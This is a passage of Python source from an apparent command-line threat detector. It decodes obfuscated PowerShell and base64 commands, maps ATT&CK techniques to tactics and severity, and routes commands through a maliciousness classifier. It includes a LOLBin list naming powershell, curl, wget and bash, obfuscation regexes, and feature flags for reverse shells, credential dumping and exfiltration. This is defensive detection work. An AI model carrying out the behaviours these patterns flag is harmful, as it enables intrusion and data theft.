            "powershell", "powershell.exe", "cmd", "cmd.exe", "wscript", "cscript",
            "bash", "sh", "curl", "wget",
        }:
            if exe not in lolbin_matches:
                lolbin_matches.insert(0, exe)
        uses_signed_proxy = bool(sem.get("uses_signed_proxy_binary")) or bool(lolbin_matches)

        # ── Semantic features (curated) ───────────────────────────────
        semantic_features = [
            k for k in self._SURFACE_SEM_FEATURES
            if sem.get(k)
        ]

        # ── Rule metadata ─────────────────────────────────────────────
        rule_strength = rule_result.get("rule_strength", "none")
        raw_rules = rule_result.get("fired_rules") or []
        fired_rules = [r.replace("_rule_", "").replace("_", " ") for r in raw_rules]

        # ── Evidence summary sentence ─────────────────────────────────
        evidence_summary = self._generate_evidence_summary(
            exe, platform, sem, rule_strength, fired_rules
        )

        # ── Derived: primary_artifact_type ────────────────────────────
        primary_artifact_type = None
        if parsed.get("registry_paths"):
            primary_artifact_type = "registry"
        elif sem.get("creates_scheduled_task"):
            primary_artifact_type = "task"
        elif sem.get("creates_or_modifies_service"):
            primary_artifact_type = "service"
        elif sem.get("archive_create") or sem.get("archive_extract"):
            primary_artifact_type = "archive"
        elif (parsed.get("urls") or parsed.get("remote_targets") or
              sem.get("downloads_remote_resource")):
            primary_artifact_type = "network"
        elif sem.get("runs_interpreter") or sem.get("executes_inline_code"):
            primary_artifact_type = "script"
        elif parsed.get("file_paths"):
            primary_artifact_type = "file"

        # ── Derived: execution_style ──────────────────────────────────
        execution_style = None
        if sem.get("downloads_remote_resource") and (
                sem.get("executes_inline_code") or has_pipe):
            execution_style = "download-and-execute"
        elif sem.get("creates_scheduled_task"):
            execution_style = "scheduled"
        elif sem.get("remote_execution_or_session"):
            execution_style = "remote-session"
        elif sem.get("executes_inline_code") or inline_code:
            execution_style = "inline"
        elif sem.get("downloads_remote_resource"):
            execution_style = "download-and-execute"

        return {
            # Execution identity
            "platform":           platform,
            "executable":         parsed.get("executable") or None,
            "subcommand":         parsed.get("subcommand") or None,
            "interpreter":        interpreter,
            # High-signal flags
            "high_signal_flags":  high_signal_flags,
            # Targets / artifacts
            "file_paths":         list(parsed.get("file_paths") or []),
            "registry_paths":     list(parsed.get("registry_paths") or []),
            "local_targets":      list(parsed.get("local_targets") or []),
            "remote_targets":     list(parsed.get("remote_targets") or []),
            # Network indicators
            "urls":               list(parsed.get("urls") or []),
            "domains":            list(parsed.get("domains") or []),
            "ips":                list(parsed.get("ips") or []),
            "ports":              list(parsed.get("ports") or []),
            # Structural behavior
            "has_pipe":           has_pipe,
            "has_redirect":       has_redirect,
            "has_chain":          has_chain,
            "inline_code":        inline_code,
            # Obfuscation / encoding
            "uses_encoded_payload":  uses_encoded_payload,
            "uses_obfuscation":      uses_obfuscation_flag,
            "obfuscation_markers":   obfuscation_markers,
            "deobfuscated_command":  deob_cmd,
            # LOLBin
            "lolbin_matches":            lolbin_matches,
            "uses_signed_proxy_binary":  uses_signed_proxy,
            # Semantic features
            "semantic_features":  semantic_features,
            # Rule / reasoning metadata
            "rule_strength":      rule_strength,
            "fired_rules":        fired_rules,
            "evidence_summary":   evidence_summary,
            # Derived
            "primary_artifact_type": primary_artifact_type,
            "execution_style":       execution_style,
        }

    def _generate_evidence_summary(self, exe: str, platform: str,
                                   sem: dict, rule_strength: str,
                                   fired_rules: list) -> str:
        """Generate a compact analyst-facing evidence sentence."""
        parts = []
        if exe:
            parts.append(exe)
        if sem.get("uses_encoded_payload") or sem.get("uses_obfuscation"):
            parts.append("encoded/obfuscated execution")
        if sem.get("downloads_remote_resource"):
            parts.append("remote resource download")
        if sem.get("executes_inline_code"):
            parts.append("inline code execution")
        if sem.get("modifies_registry_autorun"):
            parts.append("registry autorun persistence")
        if sem.get("creates_scheduled_task"):
            parts.append("scheduled task creation")
        if sem.get("deletes_shadow_copies"):
            parts.append("shadow copy deletion")
        if sem.get("enumerates_identity"):
            parts.append("account enumeration")
        if sem.get("enumerates_network_config"):
            parts.append("network discovery")
        if sem.get("reads_credential_store"):
            parts.append("credential access")
        if sem.get("remote_execution_or_session"):
            parts.append("remote execution")
        if not parts:
            if fired_rules:
                parts.append(fired_rules[0] + " behavior")
            else:
                return "No distinctive behaviors detected."
        summary = (exe.capitalize() + " " if exe else "") + ", ".join(parts[1:] or ["execution"]) + "."
        return summary.strip()

    def _build_mapping_reasons(self, top_code: str | None, evidence: dict) -> list[str]:
        reasons = []
        exe = evidence.get("executable")
        semantic = set(evidence.get("semantic_features") or [])
        fired_rules = list(evidence.get("fired_rules") or [])

        if top_code:
            reasons.extend(self._TECHNIQUE_REASON_HINTS.get(top_code, []))

        if exe and evidence.get("uses_signed_proxy_binary"):
            reasons.append(f"Uses {exe} as a signed proxy binary")
        if "deletes_shadow_copies" in semantic:
            reasons.append("Deletes shadow copies or backup restore points")
        if "modifies_registry_autorun" in semantic:
            reasons.append("Modifies registry autorun paths for persistence")
        if "creates_scheduled_task" in semantic:
            reasons.append("Creates scheduled execution for follow-on activity")
        if "downloads_remote_resource" in semantic:
            reasons.append("Retrieves content from a remote location")
        if "remote_execution_or_session" in semantic:
            reasons.append("Establishes or uses remote execution paths")
        if evidence.get("uses_encoded_payload"):
            reasons.append("Carries encoded command content")
        if evidence.get("uses_obfuscation"):
            reasons.append("Includes obfuscation markers consistent with evasion")
        if evidence.get("high_signal_flags"):
            flag_sample = ", ".join(evidence["high_signal_flags"][:2])
            reasons.append(f"Invokes high-signal flags such as {flag_sample}")
        if fired_rules:
            reasons.append(f"Triggers rule logic for {fired_rules[0]}")

        deduped = []
        seen = set()
        for reason in reasons:
            if reason not in seen:
                deduped.append(reason)
                seen.add(reason)
            if len(deduped) == 3:
                break
        return deduped

    def _build_why_mapped(self, top_code: str | None, mapping_reasons: list[str]) -> str | None:
        if not mapping_reasons:
            return None
        prefix = f"Mapped to {top_code} because " if top_code else "Mapped based on "
        if len(mapping_reasons) == 1:
            return prefix + mapping_reasons[0].lower() + "."
        return prefix + mapping_reasons[0].lower() + " and " + mapping_reasons[1].lower() + "."

    def _build_ioc_summary(self, evidence: dict) -> dict:
        file_paths = list(evidence.get("file_paths") or [])
        notable_files = [
            path for path in file_paths
            if re.search(r"\.(?:exe|dll|ps1|bat|cmd|sh|so|bin|zip|7z|tar|gz|jar)$", path, re.I)
        ]
        if not notable_files:
            notable_files = file_paths[:3]

        return {
            "domains": list(evidence.get("domains") or [])[:5],
            "ips": list(evidence.get("ips") or [])[:5],
            "urls": list(evidence.get("urls") or [])[:5],
            "notable_files": notable_files[:5],
            "registry_paths": list(evidence.get("registry_paths") or [])[:5],
        }

    def _derive_confidence_driver(self, rule_result: dict | None) -> str:
        if not rule_result:
            return "Model-led"
        strength = rule_result.get("rule_strength", "none")
        if strength == "strong":
            return "Rule-reinforced"
        if strength == "weak":
            return "Rule-supported"
        return "Model-led"

    def _build_analyst_hint(self, top_code: str | None, evidence: dict) -> str | None:
        semantic = set(evidence.get("semantic_features") or [])
        if "deletes_shadow_copies" in semantic or top_code in {"T1490", "T1486"}:
            return "This behavior is commonly associated with recovery inhibition and destructive impact activity."
        if "reads_credential_store" in semantic:
            return "This pattern is often seen in credential access workflows."
        if "modifies_registry_autorun" in semantic or "creates_scheduled_task" in semantic:
            return "This pattern is often seen in persistence setup."
        if "enumerates_identity" in semantic or top_code == "T1087":
            return "This command appears consistent with account discovery activity."
        if "enumerates_network_config" in semantic or top_code == "T1018":
            return "This command appears consistent with host or network discovery activity."
        if "downloads_remote_resource" in semantic and "executes_inline_code" in semantic:
            return "This pattern is commonly used to fetch and immediately execute a payload."
        if "remote_execution_or_session" in semantic:
            return "This pattern is often seen in remote execution or lateral movement chains."
        if evidence.get("uses_encoded_payload") or evidence.get("uses_obfuscation"):
            return "This command uses concealment patterns that are commonly associated with evasive execution."
        return None

    # ── MITRE technique → ATT&CK tactic (attack stage) ──────────────────
    _TECHNIQUE_TO_TACTIC = {
        "T1001": "Command and Control", "T1003": "Credential Access",
        "T1005": "Collection", "T1006": "Defense Evasion",
        "T1007": "Discovery", "T1010": "Discovery",
        "T1012": "Discovery", "T1014": "Defense Evasion",
        "T1016": "Discovery", "T1018": "Discovery",
        "T1020": "Exfiltration", "T1021": "Lateral Movement",
        "T1025": "Collection", "T1027": "Defense Evasion",
        "T1030": "Exfiltration", "T1033": "Discovery",
        "T1036": "Defense Evasion", "T1037": "Persistence",
        "T1039": "Collection", "T1040": "Credential Access",
        "T1041": "Exfiltration", "T1046": "Discovery",
        "T1047": "Execution", "T1048": "Exfiltration",
        "T1049": "Discovery", "T1053": "Execution",
        "T1055": "Defense Evasion", "T1056": "Collection",
        "T1057": "Discovery", "T1059": "Execution",
        "T1069": "Discovery", "T1070": "Defense Evasion",
        "T1071": "Command and Control", "T1072": "Lateral Movement",
        "T1074": "Collection", "T1078": "Persistence",
        "T1082": "Discovery", "T1083": "Discovery",
        "T1087": "Discovery", "T1090": "Command and Control",
        "T1091": "Lateral Movement", "T1095": "Command and Control",
        "T1098": "Persistence", "T1105": "Command and Control",
        "T1106": "Execution", "T1110": "Credential Access",
        "T1112": "Defense Evasion", "T1113": "Collection",
        "T1114": "Collection", "T1115": "Collection",
        "T1119": "Collection", "T1120": "Discovery",
        "T1123": "Collection", "T1124": "Discovery",
        "T1125": "Collection", "T1127": "Defense Evasion",
        "T1129": "Execution", "T1132": "Command and Control",
        "T1133": "Persistence", "T1134": "Defense Evasion",
        "T1135": "Discovery", "T1136": "Persistence",
        "T1137": "Persistence", "T1140": "Defense Evasion",
        "T1176": "Persistence", "T1187": "Credential Access",
        "T1195": "Initial Access", "T1197": "Defense Evasion",
        "T1201": "Discovery", "T1202": "Defense Evasion",
        "T1204": "Execution", "T1207": "Defense Evasion",
        "T1216": "Defense Evasion", "T1217": "Discovery",
        "T1218": "Defense Evasion", "T1219": "Command and Control",
        "T1220": "Defense Evasion", "T1221": "Execution",
        "T1222": "Defense Evasion", "T1482": "Discovery",
        "T1484": "Defense Evasion", "T1485": "Impact",
        "T1486": "Impact", "T1489": "Impact",
        "T1490": "Impact", "T1491": "Impact",
        "T1496": "Impact", "T1497": "Defense Evasion",
        "T1505": "Persistence", "T1518": "Discovery",
        "T1526": "Discovery", "T1528": "Credential Access",
        "T1529": "Impact", "T1530": "Collection",
        "T1531": "Impact", "T1539": "Credential Access",
        "T1542": "Persistence", "T1543": "Persistence",
        "T1546": "Persistence", "T1547": "Persistence",
        "T1548": "Privilege Escalation", "T1550": "Lateral Movement",
        "T1552": "Credential Access", "T1553": "Defense Evasion",
        "T1555": "Credential Access", "T1556": "Persistence",
        "T1557": "Credential Access", "T1558": "Credential Access",
        "T1559": "Execution", "T1560": "Collection",
        "T1562": "Defense Evasion", "T1563": "Lateral Movement",
        "T1564": "Defense Evasion", "T1566": "Initial Access",
        "T1567": "Exfiltration", "T1569": "Execution",
        "T1570": "Lateral Movement", "T1571": "Command and Control",
        "T1572": "Command and Control", "T1573": "Command and Control",
        "T1574": "Persistence", "T1578": "Defense Evasion",
        "T1580": "Discovery", "T1592": "Reconnaissance",
        "T1595": "Reconnaissance", "T1606": "Credential Access",
        "T1609": "Execution", "T1610": "Execution",
        "T1611": "Privilege Escalation", "T1612": "Defense Evasion",
        "T1613": "Discovery", "T1614": "Discovery",
        "T1615": "Discovery", "T1619": "Discovery",
        "T1620": "Defense Evasion", "T1622": "Defense Evasion",
        "T1648": "Execution", "T1649": "Credential Access",
        "T1651": "Execution", "T1652": "Discovery",
        "T1654": "Discovery",
    }

    # Tactic severity ranking
    _TACTIC_SEVERITY = {
        "Reconnaissance": "Low",
        "Initial Access": "High",
        "Execution": "Medium",
        "Persistence": "Medium",
        "Privilege Escalation": "High",
        "Defense Evasion": "Medium",
        "Credential Access": "High",
        "Discovery": "Low",
        "Lateral Movement": "High",
        "Collection": "Medium",
        "Command and Control": "High",
        "Exfiltration": "High",
        "Impact": "Critical",
    }

    _SEVERITY_RANK = {"Low": 0, "Medium": 1, "High": 2, "Critical": 3}

    def _derive_attack_stage(self, top_code: str | None) -> str | None:
        if not top_code:
            return None
        return self._TECHNIQUE_TO_TACTIC.get(top_code)

    def _derive_severity(self, top_code: str | None, label_conf: float,
                         evidence: dict | None) -> str:
        tactic = self._TECHNIQUE_TO_TACTIC.get(top_code or "")
        base_severity = self._TACTIC_SEVERITY.get(tactic, "Medium")
        rank = self._SEVERITY_RANK[base_severity]

        # Promote severity if confidence is very high and evidence is strong
        if label_conf >= 95.0 and evidence:
            strength = evidence.get("rule_strength", "none")
            if strength == "strong" and rank < 3:
                rank = min(rank + 1, 3)

        # Promote if obfuscation detected
        if evidence and (evidence.get("uses_obfuscation") or evidence.get("uses_encoded_payload")):
            if rank < 2:
                rank = min(rank + 1, 3)

        return {0: "Low", 1: "Medium", 2: "High", 3: "Critical"}[rank]

    def _build_response_enrichment(self, top_code: str | None, evidence: dict, rule_result: dict | None,
                                   label_conf: float = 0.0) -> dict:
        mapping_reasons = self._build_mapping_reasons(top_code, evidence)
        return {
            "mapping_reasons": mapping_reasons,
            "why_mapped": self._build_why_mapped(top_code, mapping_reasons),
            "ioc_summary": self._build_ioc_summary(evidence),
            "confidence_driver": self._derive_confidence_driver(rule_result),
            "analyst_hint": self._build_analyst_hint(top_code, evidence),
            "attack_stage": self._derive_attack_stage(top_code),
            "severity": self._derive_severity(top_code, label_conf, evidence),
        }

    def _build_variant_a_text(self, cmd: str):
        """
        Build Variant A specialist input text and return (text, rule_result).
        Format matches training exactly:
          RAW: {cmd}
          RESIDUAL: {residual}
          FEATURES: {tags}   (line omitted when no tags fire)
        """
        parsed = _parse_command(cmd)
        sem = _build_semantic_features(parsed)
        rules = _build_rule_result(parsed, sem)
        residual = _build_residual(parsed, sem, rules)
        feature_tags = _build_feature_tags(sem, rules)
        parts = [f"RAW: {cmd}", f"RESIDUAL: {residual}"]
        if feature_tags:
            parts.append(f"FEATURES: {' '.join(feature_tags)}")
        return "\n".join(parts), rules

    def calculate_entropy(self, text):
        if not text:
            return 0
        entropy = 0
        for x in range(256):
            p_x = float(text.count(chr(x))) / len(text)
            if p_x > 0:
                entropy += -p_x * math.log(p_x, 2)
        return entropy

    def is_obfuscated(self, text: str) -> bool:
        patterns = [
            r"\[char\]",
            r"base64",
            r"frombase64",
            r"reverse\(",
            r"\+[ ]*'",
            r"\$[a-z0-9_]{10,}",
            r"\\x[0-9a-f]{2}",
            r"(?i)-enc(?:odedcommand)?\s+[A-Za-z0-9+/=]{20,}",
        ]
        if any(re.search(p, text, re.I) for p in patterns):
            return True
        if self.calculate_entropy(text) > 5.2:
            return True
        return False

    _ENCODED_CMD_RE = re.compile(
        r"(?i)-(?:enc(?:odedcommand)?)\s+([A-Za-z0-9+/=]{20,})"
    )

    _SHELL_B64_PIPE_RE = re.compile(
        r"""(?:echo|printf|echo\s+-[neE]+)\s+
            ['"]?
            ([A-Za-z0-9+/]{20,}={0,2})
            ['"]?
            \s*\|\s*base64\s+-d""",
        re.X | re.I,
    )

    def deobfuscate_layer(self, text: str) -> str:
        text = self._decode_powershell_encoded_command(text)
        text = self._decode_shell_base64_pipe(text)
        text = self.universal_decoder(text)
        text = self.decode_embedded_base64(text)

        payload_only = self.extract_powershell_payload(text)
        if payload_only:
            text = payload_only

        text = self.deobfuscate_char_constructions(text)
        text = self.clean_concatenation(text)

        if pyminusone:
            try:
                text = pyminusone.deobfuscate(text, lang="powershell")
            except Exception:
                pass

        text = self.deobfuscate_char_constructions(text)
        text = self.clean_concatenation(text)

        return text

    def _decode_powershell_encoded_command(self, text: str) -> str:
        match = self._ENCODED_CMD_RE.search(text)
        if not match:
            return text
        blob = match.group(1)
        try:
            raw = base64.b64decode(blob)
            try:
                utf16 = raw.decode("utf-16-le")
                ascii_printable = sum(1 for c in utf16 if '\x20' <= c <= '\x7e' or c in '\r\n\t')
                if ascii_printable > len(utf16) * 0.6 and len(utf16) > 3:
                    return utf16
            except (UnicodeDecodeError, ValueError):
                pass
            decoded = raw.decode("utf-8", errors="ignore")
            if len(decoded) > 3:
                return decoded
        except Exception:
            pass
        return text

    def _decode_shell_base64_pipe(self, text: str) -> str:
        def _repl(m):
            blob = m.group(1)
            try:
                decoded = base64.b64decode(blob).decode("utf-8", errors="ignore")
                printable = sum(1 for c in decoded if c.isprintable() or c in '\r\n\t')
                if printable > len(decoded) * 0.7 and len(decoded) > 3:
                    return m.group(0).replace(blob, decoded)
            except Exception:
                pass
            return m.group(0)
        return self._SHELL_B64_PIPE_RE.sub(_repl, text)

    def deobfuscate_char_constructions(self, text: str) -> str:
        range_loop_pattern = re.compile(
            r"\(\s*(\d{1,3})\s*\.\.\s*(\d{1,3})\s*\)\s*\|\s*%\s*\{\s*\[char\]\s*\$_\s*\}",
            re.I,
        )

        def _range_to_chars(match):
            start = int(match.group(1))
            end = int(match.group(2))
            if start > end:
                start, end = end, start
            start = max(0, min(start, 255))
            end = max(0, min(end, 255))
            return "".join(chr(i) for i in range(start, end + 1))

        text = range_loop_pattern.sub(lambda m: json.dumps(_range_to_chars(m)), text)

        single_char_pattern = re.compile(r"\[char\]\s*\(?\s*(\d{1,3})\s*\)?", re.I)

        def _single_char(match):
            value = int(match.group(1))
            value = max(0, min(value, 255))
            return json.dumps(chr(value))

        text = single_char_pattern.sub(_single_char, text)

        mixed_concat_pattern = re.compile(
            r"\(\s*(\d{1,3})\s*\.\.\s*(\d{1,3})\s*\)\s*\+\s*([A-Za-z_][A-Za-z0-9_]*)\s*\|\s*%\s*\{\s*\[char\]\s*\$_\s*\}",
            re.I,
        )

        def _mixed_concat(match):
            start = int(match.group(1))
            end = int(match.group(2))
            suffix = match.group(3)
            lead = chr(max(0, min(start, 255)))
            if abs(start - end) <= 32:
                return json.dumps(f"{lead}{suffix}")
            step = 1 if end >= start else -1
            decoded = "".join(chr(max(0, min(i, 255))) for i in range(start, end + step, step))
            return json.dumps(f"{decoded}{suffix}")

        return mixed_concat_pattern.sub(_mixed_concat, text)

    def clean_concatenation(self, text: str) -> str:
        quoted_join_pattern = re.compile(r"\"((?:\\.|[^\"\\])*)\"\s*\+\s*\"((?:\\.|[^\"\\])*)\"")

        while True:
            new_text = quoted_join_pattern.sub(lambda m: json.dumps(m.group(1) + m.group(2)), text)
            if new_text == text:
                break
            text = new_text

        q_plus_word = re.compile(r"\"((?:\\.|[^\"\\])*)\"\s*\+\s*([A-Za-z_][A-Za-z0-9_]*)")
        text = q_plus_word.sub(lambda m: json.dumps(m.group(1) + m.group(2)), text)

        return text

    def extract_powershell_payload(self, text: str):
        payload = self._extract_invocation_payload(text)
        if payload is None:
            payload = text.strip()

        utf8_match = re.match(
            r"^\s*\[System\.Text\.Encoding\]::UTF8\.GetString\(\s*\[System\.Convert\]::(?P<quoted>(?:\"(?:\\.|[^\"\\])*\")|(?:'(?:\\.|[^'\\])*'))\s*\)\s*$",
            payload,
            re.I,
        )
        if utf8_match:
            quoted = utf8_match.group("quoted")
            if quoted.startswith('"'):
                try:
                    return json.loads(quoted).strip()
                except Exception:
                    return quoted.strip('"').strip()
            return quoted.strip("'").strip()

        return payload if payload != text.strip() else None

    def _extract_invocation_payload(self, text: str):
        s = text.strip()
        if not s.startswith("&("):
            return None

        builder_start = s.find("(")
        builder_end = self._find_matching_paren(s, builder_start)
        if builder_end == -1:
            return None

        idx = builder_end + 1
        while idx < len(s) and s[idx].isspace():
            idx += 1

        if idx >= len(s) or s[idx] != "(":
            return None

        payload_end = self._find_matching_paren(s, idx)
        if payload_end == -1:
            return None

        if s[payload_end + 1 :].strip():
            return None

        payload = s[idx + 1 : payload_end].strip()
        return payload or None

    def _find_matching_paren(self, text: str, start_index: int) -> int:
        if start_index < 0 or start_index >= len(text) or text[start_index] != "(":
            return -1

        depth = 0
        in_single = False
        in_double = False

        i = start_index
        while i < len(text):
            ch = text[i]

            if ch == "`":
                i += 2
                continue

            if in_single:
                if ch == "'":
                    in_single = False
                i += 1
                continue

            if in_double:
                if ch == '"':
                    in_double = False
                i += 1
                continue

            if ch == "'":
                in_single = True
            elif ch == '"':
                in_double = True
            elif ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    return i

            i += 1

        return -1

    def decode_embedded_base64(self, text: str) -> str:
        pattern = re.compile(r"FromBase64String\(\s*['\"]([A-Za-z0-9+/=]{8,})['\"]\s*\)", re.I)

        def _decode(match):
            b64_payload = match.group(1)
            try:
                decoded = base64.b64decode(b64_payload).decode("utf-8", errors="ignore")
                return json.dumps(decoded)
            except Exception:
                return match.group(0)

        return pattern.sub(_decode, text)

    def universal_decoder(self, text: str) -> str:
        try:
            if re.match(
                r"^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$",
                text,
            ):
                decoded = base64.b64decode(text).decode("utf-8", errors="ignore")
                if len(decoded) > 3:
                    return decoded
        except Exception:
            pass
        return text

    # Class indices: 0=Benign, 1=Malicious, 2=Context_Dependent
    _GATE_LABELS = ["Benign", "Malicious", "Context_Dependent"]

    def _summarize_gate_probs(self, probs: torch.Tensor) -> dict:
        probs = probs.squeeze(0)
        benign_prob = float(probs[0].item())
        malicious_prob = float(probs[1].item())
        ctx_prob = float(probs[2].item()) if probs.size(0) > 2 else 0.0
        top_vals, top_idxs = torch.topk(probs, k=min(2, probs.size(0)), largest=True, sorted=True)
        predicted_idx = int(top_idxs[0].item())
        second_idx = int(top_idxs[1].item()) if len(top_idxs) > 1 else predicted_idx
        label = self._GATE_LABELS[predicted_idx]
        second_label = self._GATE_LABELS[second_idx]
        label_conf = float(top_vals[0].item())
        second_conf = float(top_vals[1].item()) if len(top_vals) > 1 else 0.0
        return {
            "label": label,
            "public_label": self._PUBLIC_LABEL_MAP[label],
            "second_label": second_label,
            "second_public_label": self._PUBLIC_LABEL_MAP[second_label],
            "benign_prob": benign_prob,
            "malicious_prob": malicious_prob,
            "ctx_prob": ctx_prob,
            "label_conf": label_conf,
            "second_conf": second_conf,
            "decision_margin": max(0.0, label_conf - second_conf),
            "class_probabilities": {
                "Benign": benign_prob,
                "Suspicious": ctx_prob,
                "Malicious": malicious_prob,
            },
            "decision_mode": "model_probs",
        }

    def _select_gate_summary(self, primary_probs: torch.Tensor, raw_probs: torch.Tensor | None = None) -> dict:
        primary = self._summarize_gate_probs(primary_probs)
        primary["model_view"] = "deobfuscated"
        if raw_probs is None:
            return primary

        raw_summary = self._summarize_gate_probs(raw_probs)
        raw_summary["model_view"] = "raw"

        primary_risk = primary["class_probabilities"]["Malicious"] + (0.55 * primary["class_probabilities"]["Suspicious"])
        raw_risk = raw_summary["class_probabilities"]["Malicious"] + (0.55 * raw_summary["class_probabilities"]["Suspicious"])
        chosen = raw_summary if raw_risk > primary_risk + 0.03 else primary
        chosen["alternate_view"] = raw_summary if chosen is primary else primary
        return chosen

    def _matches_any(self, text_views: list[str], pattern: re.Pattern) -> bool:
        return any(pattern.search(view) for view in text_views if view)

    def _is_simple_operational_benign(self, text_views: list[str]) -> bool:
        return any(self._matches_any(text_views, pattern) for pattern in self._SIMPLE_OPERATIONAL_BENIGN_PATTERNS)

    def _extract_routing_features(self, raw_cmd: str, deobfuscated_cmd: str | None = None) -> dict:
        text_views = []
        for candidate in (raw_cmd, deobfuscated_cmd):
            if candidate:
                normalized = candidate.lower().strip()
                if normalized and normalized not in text_views:
                    text_views.append(normalized)

        features = {
            "has_download": self._matches_any(text_views, self._DOWNLOAD_RE),
            "has_pipe_to_shell": self._matches_any(text_views, self._PIPE_TO_SHELL_RE),
            "has_reverse_shell_pattern": self._matches_any(text_views, self._REVERSE_SHELL_RE),
            "has_base64_or_encoded_exec": self._matches_any(text_views, self._BASE64_EXEC_RE),
            "has_eval_exec": self._matches_any(text_views, self._EVAL_EXEC_RE),
            "has_shell_spawn": self._matches_any(text_views, self._SHELL_SPAWN_RE),
            "has_sensitive_file_read": self._matches_any(text_views, self._SENSITIVE_FILE_READ_RE),
            "has_network_enum": self._matches_any(text_views, self._NETWORK_ENUM_RE),
            "has_process_enum": self._matches_any(text_views, self._PROCESS_ENUM_RE),
            "has_tunneling": self._matches_any(text_views, self._TUNNELING_RE),
            "has_packet_capture": self._matches_any(text_views, self._PACKET_CAPTURE_RE),
            "has_debug_trace": self._matches_any(text_views, self._DEBUG_TRACE_RE),
            "has_offensive_tooling": self._matches_any(text_views, self._OFFENSIVE_TOOLING_RE),
            "has_persistence_change": self._matches_any(text_views, self._PERSISTENCE_RE),
            "has_privilege_escalation": self._matches_any(text_views, self._PRIVESC_RE),
            "has_defense_impairment": self._matches_any(text_views, self._DEFENSE_IMPAIR_RE),
            "has_destructive_write": self._matches_any(text_views, self._DESTRUCTIVE_RE),
            "has_archive_or_bulk_copy": self._matches_any(text_views, self._ARCHIVE_BULK_RE),
            "has_remote_transfer": self._matches_any(text_views, self._REMOTE_TRANSFER_RE),
            "has_service_or_system_inspection": self._matches_any(text_views, self._SERVICE_INSPECTION_RE),
            "has_credential_dumping_pattern": self._matches_any(text_views, self._CREDENTIAL_DUMP_RE),
            "has_simple_benign_check": self._is_simple_operational_benign(text_views),
            "has_sensitive_source": self._matches_any(text_views, self._SENSITIVE_SOURCE_RE),
            "has_exploit_or_attack_tooling": self._matches_any(text_views, self._EXPLOIT_OR_ATTACK_TOOLING_RE),
            "has_benign_admin_workflow": self._matches_any(text_views, self._BENIGN_ADMIN_WORKFLOW_RE),
            "has_local_artifact_inspection": self._matches_any(text_views, self._LOCAL_ARTIFACT_INSPECTION_RE),
            "has_benign_snapshot_source": self._matches_any(text_views, self._BENIGN_SNAPSHOT_SOURCE_RE),
            "has_benign_archive_command": self._matches_any(text_views, self._BENIGN_ARCHIVE_PATH_RE),
            "has_controlled_remote_target": self._matches_any(text_views, self._CONTROLLED_REMOTE_TARGET_RE),
            "has_controlled_remote_copy": self._matches_any(text_views, self._CONTROLLED_REMOTE_COPY_RE),
            "has_openssl_client_inspection": self._matches_any(text_views, self._OPENSSL_CLIENT_INSPECTION_RE),
            "has_routine_service_log_inspection": self._matches_any(text_views, self._ROUTINE_SERVICE_LOG_RE),
            "has_container_readonly_admin": self._matches_any(text_views, self._CONTAINER_ADMIN_READONLY_RE),
            "has_enumeration_recon": self._matches_any(text_views, self._ENUMERATION_RECON_RE),
            "has_aggressive_nmap": self._matches_any(text_views, self._AGGRESSIVE_NMAP_RE),
            "has_post_exploit_technique": self._matches_any(text_views, self._POST_EXPLOIT_RE),
            "has_exfil_data_movement": self._matches_any(text_views, self._EXFIL_DATA_MOVEMENT_RE),
        }
        return features

    def _label_threshold(self, public_label: str) -> float:
        if public_label == "Benign":
            return benign_conf_threshold
        if public_label == "Malicious":
            return malicious_conf_threshold
        return suspicious_conf_threshold

    def _triggered_features(self, features: dict) -> list[str]:
        return sorted(name for name, value in features.items() if value)

    def _build_route_result(
        self,
        label: str,
        label_confidence: float,
        reason: str,
        policy: str,
        features: dict,
        should_run_specialist: bool,
    ) -> dict:
        return {
            "label": self._INTERNAL_LABEL_MAP[label],
            "label_confidence": label_confidence,
            "reason": reason,
            "routing_policy": policy,
            "triggered_features": self._triggered_features(features),
            "should_run_specialist": should_run_specialist,
        }

    def _malicious_promotion_features(self, features: dict) -> tuple[list[str], list[str]]:
        forced_malicious_features = [
            name for name in (
                "has_pipe_to_shell",
                "has_reverse_shell_pattern",
                "has_persistence_change",
                "has_privilege_escalation",
                "has_defense_impairment",
                "has_destructive_write",
                "has_credential_dumping_pattern",
            )
            if features.get(name)
        ]

        malicious_promotion_features = list(forced_malicious_features)
        if features.get("has_exploit_or_attack_tooling"):
            malicious_promotion_features.append("has_exploit_or_attack_tooling")
        if features.get("has_remote_transfer") and features.get("has_sensitive_source"):
            malicious_promotion_features.append("remote_transfer_sensitive_source")
        if features.get("has_archive_or_bulk_copy") and features.get("has_sensitive_source"):
            malicious_promotion_features.append("archive_sensitive_source")
        if features.get("has_download") and (
            features.get("has_eval_exec")
            or features.get("has_shell_spawn")
            or features.get("has_base64_or_encoded_exec")
        ):
            malicious_promotion_features.append("download_exec_chain")
        if features.get("has_aggressive_nmap"):
            malicious_promotion_features.append("has_aggressive_nmap")
        if features.get("has_post_exploit_technique"):
            malicious_promotion_features.append("has_post_exploit_technique")

        return forced_malicious_features, malicious_promotion_features

    def _suspicious_signals(self, features: dict) -> list[str]:
        return [
            name for name in (
                "has_tunneling",
                "has_packet_capture",
                "has_debug_trace",
                "has_offensive_tooling",
                "has_sensitive_file_read",
                "has_archive_or_bulk_copy",
                "has_remote_transfer",
                "has_eval_exec",
                "has_download",
                "has_base64_or_encoded_exec",
                "has_shell_spawn",
                "has_enumeration_recon",
                "has_exfil_data_movement",
            )
            if features.get(name)
        ]

    def _benign_safe_override(
        self,
        class_probs: dict,
        margin: float,
        features: dict,
        forced_malicious_features: list[str],
    ) -> dict | None:
        triggered = set(self._triggered_features(features))
        allowed_benign_features = {
            "has_simple_benign_check",
            "has_benign_admin_workflow",
            "has_service_or_system_inspection",
            "has_local_artifact_inspection",
            "has_benign_snapshot_source",
            "has_benign_archive_command",
            "has_controlled_remote_target",
            "has_controlled_remote_copy",
            "has_openssl_client_inspection",
            "has_routine_service_log_inspection",
            "has_container_readonly_admin",
            # Observational / read-only features — not attack indicators
            "has_network_enum",
            "has_process_enum",
            # Broad operational features — only dangerous in combination
            "has_download",
            "has_archive_or_bulk_copy",
        }
        # Remote transfers are allowed only when targeting controlled infrastructure
        if features.get("has_controlled_remote_target"):
            allowed_benign_features.add("has_remote_transfer")
        disallowed_benign_features = triggered - allowed_benign_features

        if (
            features.get("has_simple_benign_check")
            and not disallowed_benign_features
            and not forced_malicious_features
        ):
            return self._build_route_result(
                label="Benign",
                label_confidence=max(class_probs["Benign"], 0.78 if margin >= low_margin_threshold else 0.72),
